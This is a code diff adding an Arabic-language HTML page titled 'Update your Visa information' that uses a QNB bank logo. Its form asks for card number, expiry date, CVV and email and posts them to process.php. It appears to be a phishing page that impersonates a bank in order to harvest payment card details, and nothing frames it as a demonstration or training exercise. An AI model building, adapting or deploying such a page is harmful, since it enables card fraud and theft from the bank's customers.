@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث معلومات الفيزا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7fc;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            direction: rtl; /* لتوجيه النص من اليمين لليسار */
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            max-width: 150px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+
+        label {
+            font-size: 16px;
+            margin-bottom: 8px;
+            display: block;
+            color: #555;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+        }
+
+        input:focus {
+            border-color: #4CAF50;
+            outline: none;
+            background-color: #e8f5e9;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- ضع رابط الصورة هنا -->
+            <img src="QNB-logo.jpg" alt="شعار الموقع">
+        </div>
+        <h2>تحديث معلومات الفيزا الخاصة بك</h2>
+        <form action="process.php" method="POST">
+            <label for="cardNumber">رقم البطاقة:</label>
+            <input type="text" id="cardNumber" name="cardNumber" required placeholder="أدخل رقم البطاقة">
+
+            <label for="expiryDate">تاريخ الانتهاء (MM/YY):</label>
+            <input type="text" id="expiryDate" name="expiryDate" required placeholder="MM/YY">
+
+            <label for="cvv">رقم CVV:</label>
+            <input type="text" id="cvv" name="cvv" required placeholder="أدخل رقم CVV">
+
+            <label for="email">البريد الإلكتروني:</label>
+            <input type="email" id="email" name="email" required placeholder="أدخل بريدك الإلكتروني">
+
+            <button type="submit">تحديث المعلومات</button>
+        </form>
+    </div>
+</body>
+</html>
